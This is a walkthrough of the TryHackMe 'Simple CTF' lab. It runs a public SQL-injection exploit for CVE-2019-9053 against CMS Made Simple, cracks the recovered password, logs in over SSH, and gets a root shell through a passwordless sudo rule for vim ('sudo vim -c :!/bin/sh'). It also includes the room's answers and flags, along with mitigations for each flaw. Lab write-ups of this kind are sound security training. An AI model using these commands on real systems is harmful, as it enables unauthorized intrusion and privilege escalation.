# Simple CTF Walkthrough

**Target:** Simple CTF
**Source:** [TryHackMe](https://tryhackme.com/room/easyctf)
**Difficulty:** Easy
**Target IP:** 10.81.181.252

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [CMS Made Simple SQL Injection](#cms-made-simple-sql-injection)
- [Initial Foothold via SSH (mitch)](#initial-foothold-via-ssh-mitch)
- [Privilege Escalation via vim](#privilege-escalation-via-vim)
- [Room Answers](#room-answers)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Simple CTF is a beginner-level Linux box that pairs a known CMS vulnerability
with a classic sudo misconfiguration. CMS Made Simple is identified via
directory brute forcing, a public SQL injection exploit cracks a password
hash, and that password unlocks SSH as a low-privilege user. From there, a
passwordless `sudo` entry for `vim` is leveraged for immediate privilege
escalation to root via GTFOBins.

**Key Skills Required:**
- Service enumeration (`nmap`)
- Web content discovery (`gobuster`)
- CMS fingerprinting and exploit lookup (`searchsploit`)
- SQL injection / hash extraction and cracking
- GTFOBins-style sudo abuse (`vim`)

---

## Reconnaissance

### Network Scanning

```bash
nmap -sVC -O -p- 10.81.181.252
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | ftp | vsftpd 3.0.3 (anonymous login allowed, listing timed out) |
| 80/tcp | http | Apache httpd 2.4.18 (Ubuntu) |
| 2222/tcp | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |

> **Q1 — services under port 1000:** `2` (21 and 80)
> **Q2 — service on the higher port:** `ssh`

---

## Web Enumeration

```bash
gobuster dir -u http://10.81.181.252/ -w /usr/share/wordlists/dirb/common.txt
```

```
robots.txt           (Status: 200) [Size: 929]
simple               (Status: 301) [Size: 315] [--> http://10.81.181.252/simple/]
```

`robots.txt` discloses a second disallowed path that confirms the CMS
install location:

```bash
curl http://10.81.181.252/robots.txt
```

```
Disallow: /
Disallow: /openemr-5_0_1_3
```

Browsing `/simple/` confirms a **CMS Made Simple** installation via its
generator meta tag:

```html
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019..." />
```

---

## CMS Made Simple SQL Injection

```bash
searchsploit cms made simple 2.2.8
```

```
CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py
```

> **Q4 — CVE used:** `CVE-2019-9053`
> **Q5 — vulnerability type:** `sqli`

```bash
searchsploit -m 46635.py
python2 46635.py -u http://10.81.181.252/simple --crack -w /usr/share/wordlists/rockyou.txt
```

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

> **Q6 — password:** `secret`

---

## Initial Foothold via SSH (mitch)

```bash
ssh mitch@10.81.181.252 -p 2222
```

> **Q7 — login method:** `ssh`

```bash
$ whoami
mitch
$ cat user.txt
G00d j0b, keep up!
```

> **Q8 — user flag:** `G00d j0b, keep up!`

Checking `/home` reveals a second account:

```bash
$ cd .. && ls
mitch  sunbath
```

> **Q9 — other user:** `sunbath`

---

## Privilege Escalation via vim

```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

> **Q10 — binary to leverage:** `vim`

`vim` run as root with no password requirement is a documented GTFOBins
privilege-escalation primitive — spawning a shell from within `vim` inherits
root privileges:

```bash
$ sudo vim -c ':!/bin/sh'
# whoami
root
# cat /root/root.txt
W3ll d0n3. You made it!
```

> **Q11 — root flag:** `W3ll d0n3. You made it!`

---

## Room Answers

| # | Question | Answer |
|---|----------|--------|
| Q1 | Services running under port 1000 | `2` (21 and 80) |
| Q2 | Service on the higher port | `ssh` |
| Q4 | CVE used against the application | `CVE-2019-9053` |
| Q5 | Vulnerability type | `sqli` |
| Q6 | Password | `secret` |
| Q7 | Login method with obtained details | `ssh` |
| Q8 | User flag | `G00d j0b, keep up!` |
| Q9 | Other user in home directory | `sunbath` |
| Q10 | Binary leveraged for a privileged shell | `vim` |
| Q11 | Root flag | `W3ll d0n3. You made it!` |

---

## Vulnerabilities

### 1. Outdated CMS Vulnerable to SQL Injection (Critical)

**Description:** CMS Made Simple 2.2.8 is affected by a public,
pre-authentication SQL injection vulnerability (CVE-2019-9053) that leaks
the admin password hash and salt.

**Impact:** Credential disclosure leading to authenticated/SSH access.

**Mitigation:**
- Upgrade CMS Made Simple past 2.2.10.
- Apply a WAF rule set and routine vulnerability scanning for third-party
  CMS deployments.

### 2. Weak Password Crackable via Wordlist (High)

**Description:** The extracted password hash cracked against `rockyou.txt`
in seconds, yielding a dictionary-weak plaintext password (`secret`).

**Impact:** Full account takeover once the hash was recovered.

**Mitigation:**
- Enforce a strong password policy with minimum entropy requirements.
- Use a modern, salted, slow hashing algorithm and monitor for weak
  passwords proactively.

### 3. Passwordless Sudo Rule for `vim` (Critical)

**Description:** `mitch` could run `/usr/bin/vim` as root with no password
via `sudo`, a documented GTFOBins escape primitive.

**Impact:** Trivial, immediate privilege escalation to root.

**Mitigation:**
- Avoid granting sudo rights to general-purpose editors, interpreters, or
  shells.
- Apply the principle of least privilege; if `vim` access is required,
  restrict it via a wrapper that disables shell-out commands.

---

## Attack Chain Summary

```
Nmap scan → FTP, HTTP, SSH (2222)
    ↓
gobuster → robots.txt → /simple/ → CMS Made Simple 2.2.8 identified
    ↓
searchsploit → CVE-2019-9053 SQLi (46635.py)
    ↓
python2 46635.py --crack rockyou.txt → mitch:secret
    ↓
ssh mitch -p 2222 → foothold, user.txt, second user: sunbath
    ↓
sudo -l → NOPASSWD vim
    ↓
sudo vim -c ':!/bin/sh' → root
    ↓
Room complete (Q1–Q11 answered)
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/OS detection |
| Gobuster | Hidden directory discovery |
| cURL | Fetching web content |
| searchsploit | CVE-2019-9053 exploit lookup and SQLi/crack script |
| ssh | Foothold access |
| GTFOBins (vim) | Sudo privilege escalation |

---

## References

- [TryHackMe — Simple CTF](https://tryhackme.com/room/easyctf)
- [CVE-2019-9053 — NVD](https://nvd.nist.gov/vuln/detail/cve-2019-9053)
- [GTFOBins — vim](https://gtfobins.github.io/gtfobins/vim/)

---
